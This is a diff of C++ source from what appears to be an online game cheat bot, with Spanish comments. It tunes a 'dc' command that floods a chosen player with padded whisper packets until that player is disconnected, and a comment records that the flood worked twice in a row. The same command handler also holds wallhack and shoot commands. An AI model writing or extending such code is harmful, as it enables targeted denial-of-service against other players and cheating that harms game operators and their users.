@@ -130,20 +130,33 @@ void Command::set_wallhack(bool enabled){
 	print(string("Set wallhack ") + (enabled ? "on." : "off."));
 }
 
+// 100 msgs de 500 le ha dc y no ha roto, 2 veces seguidas.
 void Command::_disconnect() {
+	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
+	/*cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
+	string buf;
+	for (int i = 0; i < instance->disconnect_packets; i++)
+		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i)).get_buf();
+	Packet p(buf);
+	p.send();*/
+
+	
+	char c = 'a';
 	int i = 0;
-	while (instance->disconnecting && i < 1000) {
+	while (instance->disconnecting && i < instance->disconnect_packets) {
 		cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
-		CG_Whisper p(instance->username_dc, to_string(i) + string(1000, 'a') + to_string(i));
+		CG_Whisper p(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i));
 		p.send();
 		//Sleep(1);
 		i++;
 	}
+	
 	instance->disconnecting = false;
 }
 
-void Command::disconnect(const string& username){
+void Command::disconnect(const string& username, int n_packets){
 	instance->username_dc = username;
+	instance->disconnect_packets = n_packets;
 	if (!instance->disconnecting){
 		instance->disconnecting = true;
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
@@ -184,8 +197,10 @@ void Command::run(const string& _cmd){
 			send(cmd[1]);
 
 	} else if (cmd[0] == "wallhack"){
-		if (check = check_n_args(1, cmd))
+		if (check = check_n_args(1, cmd)){
+
 			set_wallhack((bool)stoi(cmd[1]));
+		}
 
 	} else if (cmd[0] == "shoot"){
 		// TESTING
@@ -200,7 +215,10 @@ void Command::run(const string& _cmd){
 
 	} else if (cmd[0] == "dc"){
 		if (check = check_n_args(1, cmd))
-			disconnect(cmd[1]);
+			if (check_n_args(2, cmd))
+				disconnect(cmd[1], stoi(cmd[2]));
+			else
+				disconnect(cmd[1]);
 
 	} else if (cmd[0] == "dc_stop"){
 		instance->disconnecting = false;
